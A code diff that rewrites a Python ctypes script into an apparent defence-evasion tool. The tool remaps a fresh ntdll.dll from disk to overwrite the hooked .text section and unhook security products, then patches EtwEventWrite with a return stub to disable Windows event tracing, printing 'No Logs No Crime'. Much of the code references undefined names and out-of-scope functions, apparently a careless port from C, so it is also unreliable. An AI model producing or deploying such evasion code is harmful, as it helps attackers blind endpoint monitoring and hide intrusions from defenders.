@@ -1,80 +1,121 @@
 import ctypes
+import sys
+from ctypes import *
+from ctypes.wintypes import *
 
-# Step 1: Display banner and initialize variables
-print("Welcome to my app!")
-ntdll_file = "ntdll.dll"
+def UnhookNTDLL(hNtdll, pMapping):
+    """
+    UnhookNTDLL() finds .text segment of fresh loaded copy of ntdll.dll and copies over the hooked one
+    """
+    oldprotect = DWORD(0)
+    pidh = PIMAGE_DOS_HEADER(pMapping)
+    pinh = PIMAGE_NT_HEADERS(DWORD(pMapping) + pidh.e_lfanew)
 
-# Step 2: Open the ntdll.dll file
-ntdll_handle = ctypes.windll.kernel32.CreateFileA(
-    ntdll_file,
-    ctypes.c_uint32(0x80000000),  # GENERIC_READ
-    ctypes.c_uint32(0x00000001),  # FILE_SHARE_READ
-    None,
-    ctypes.c_uint32(3),  # OPEN_EXISTING
-    ctypes.c_uint32(0),
-    None
-)
+    # find .text section
+    for i in range(pinh.FileHeader.NumberOfSections):
+        pish = PIMAGE_SECTION_HEADER(DWORD(IMAGE_FIRST_SECTION(pinh)) + DWORD(IMAGE_SIZEOF_SECTION_HEADER) * i)
 
-if ntdll_handle == -1:
-    print("Failed to open ntdll.dll file")
-    exit()
+        if not strcmp(c_char_p(pish.Name), b".text"):
+            # prepare ntdll.dll memory region for write permissions.
+            VirtualProtect_p(LPVOID(DWORD(hNtdll) + pish.VirtualAddress), pish.Misc.VirtualSize, PAGE_EXECUTE_READWRITE, byref(oldprotect))
+            if not oldprotect:
+                # RWX failed!
+                return -1
+            # copy original .text section into ntdll memory
+            memmove(LPVOID(DWORD(hNtdll) + pish.VirtualAddress), LPVOID(DWORD(pMapping) + pish.VirtualAddress), pish.Misc.VirtualSize)
 
-# Step 3: Create a file mapping
-file_mapping = ctypes.windll.kernel32.CreateFileMappingA(
-    ntdll_handle,
-    None,
-    ctypes.c_uint32(0x02),  # PAGE_READONLY
-    ctypes.c_uint32(0),
-    ctypes.c_uint32(0),
-    None
-)
+            # restore original protection settings of ntdll
+            VirtualProtect_p(LPVOID(DWORD(hNtdll) + pish.VirtualAddress), pish.Misc.VirtualSize, oldprotect, byref(oldprotect))
+            if not oldprotect:
+                # it failed
+                return -1
+            return 0
+    return -1
 
-if file_mapping == 0:
-    print("Failed to create file mapping")
-    ctypes.windll.kernel32.CloseHandle(ntdll_handle)
-    exit()
+def FuckEtw():
+    oldprotect = DWORD(0)
 
-# Step 4: Map the file into memory
-mapped_file = ctypes.windll.kernel32.MapViewOfFile(
-    file_mapping,
-    ctypes.c_uint32(0x04),  # FILE_MAP_READ
-    ctypes.c_uint32(0),
-    ctypes.c_uint32(0),
-    ctypes.c_uint32(0)
-)
+    pEventWrite = GetProcAddress(GetModuleHandleA(b"ntdll.dll"), b"EtwEventWrite")
 
-if not mapped_file:
-    print("Failed to map the file into memory")
-    ctypes.windll.kernel32.CloseHandle(file_mapping)
-    ctypes.windll.kernel32.CloseHandle(ntdll_handle)
-    exit()
+    if not VirtualProtect_p(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, byref(oldprotect)):
+        print("[!] VirtualProtect Failed With Error : %d" % GetLastError())
+        return False
 
-# Step 5: Call UnhookNTDLL function
-# Define the UnhookNTDLL function prototype
-UnhookNTDLL = ctypes.WINFUNCTYPE(None, ctypes.c_void_p)(("UnhookNTDLL", ctypes.windll.ntdll))
+    if sys.maxsize > 2**32:
+        memcpy(pEventWrite, b"\x48\x33\xc0\xc3", 4)        # xor rax, rax; ret
+    else:
+        memcpy(pEventWrite, b"\x33\xc0\xc2\x14\x00", 5)    # xor eax, eax; ret 14
 
-# Call the UnhookNTDLL function
-UnhookNTDLL()
+    if not VirtualProtect_p(pEventWrite, 4096, oldprotect, byref(oldprotect)):
+        print("[!] VirtualProtect Failed With Error : %d" % GetLastError())
+        return False
+    if not FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096):
+        print("[!] FlushInstructionCache Failed With Error : %d" % GetLastError())
+        return False
 
-# Step 6: Display the address of the unhooked Ntdll base
-print("Address of the unhooked Ntdll base:", mapped_file)
+    return True
 
-# Step 7: Clean up the mapped file and handles
-ctypes.windll.kernel32.UnmapViewOfFile(mapped_file)
-ctypes.windll.kernel32.CloseHandle(file_mapping)
-ctypes.windll.kernel32.CloseHandle(ntdll_handle)
+def main():
+    Banner()
 
-# Step 8: Display the current process ID and wait for user input 
-process_id = ctypes.windll.kernel32.GetCurrentProcessId()
-print("Current Process ID:", process_id)
-input("Press Enter to continue...")
+    ret = 0
+    hFile = HANDLE(0)
 
-# Step 9: Call the FuckEtw function to patch the ETW
-# Define the FuckEtw function prototype
-FuckEtw = ctypes.WINFUNCTYPE(None)(("FuckEtw", ctypes.windll.your_dll))
+    hFileMapping = HANDLE(0)
+    pMapping = LPVOID(0)
 
-# Call the FuckEtw function
-FuckEtw()
+    CreateFileMappingA_p = WINFUNCTYPE(HANDLE, HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR)(GetProcAddress(GetModuleHandleA(b"kernel32"), b"CreateFileMappingA"))
+    MapViewOfFile_p = WINFUNCTYPE(LPVOID, HANDLE, DWORD, DWORD, DWORD, SIZE_T)(GetProcAddress(GetModuleHandleA(b"kernel32"), b"MapViewOfFile"))
 
-# Step 10: Display a message indicating that the ETW has been patched
-print("ETW has been patched!")
+    UnmapViewOfFile_p = WINFUNCTYPE(BOOL, LPCVOID)(GetProcAddress(GetModuleHandleA(b"kernel32"), b"UnmapViewOfFile"))
+    VirtualProtect_p = WINFUNCTYPE(BOOL, LPVOID, SIZE_T, DWORD, PDWORD)(GetProcAddress(GetModuleHandleA(b"kernel32"), b"VirtualProtect"))
+
+    print("\n[i] Hooked Ntdll Base Address : 0x%p" % pLocalNtdll)
+    # open ntdll.dll
+    XORcrypt(sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1])
+    hFile = CreateFileA(sNtdllPath, GENERIC_READ, FILE_SHARE_READ, None, OPEN_EXISTING, 0, None)
+    if hFile == INVALID_HANDLE_VALUE:
+        # failed to open ntdll.dll
+        return -1
+
+    # prepare file mapping
+    hFileMapping = CreateFileMappingA_p(hFile, None, PAGE_READONLY | SEC_IMAGE, 0, 0, None)
+    if not hFileMapping:
+        # file mapping failed
+        CloseHandle(hFile)
+        return -1
+
+    # map the bastard
+    pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0)
+    if not pMapping:
+        # mapping failed
+        CloseHandle(hFileMapping)
+        CloseHandle(hFile)
+        return -1
+
+    # remove hooks
+    ret = UnhookNTDLL(GetModuleHandleA(sNtdllPath), pMapping)
+
+    print("[i] Unhooked Ntdll Base Address: 0x%p" % sNtdll)
+
+    # Clean up.
+    UnmapViewOfFile_p(pMapping)
+    CloseHandle(hFileMapping)
+    CloseHandle(hFile)
+
+    print("\n[+] PID Of The Current Proccess: [%d]\n" % GetCurrentProcessId())
+    print("\n[#] Ready For ETW Patch.\n")
+
+    print("[+] Press <Enter> To Patch ETW ...\n")
+    input()
+
+    if not FuckEtw():
+        return EXIT_FAILURE
+
+    print("\n[+] ETW Patched, No Logs No Crime ! \n")
+    print("\n")
+
+    return 0
+
+if __name__ == "__main__":
+    main()
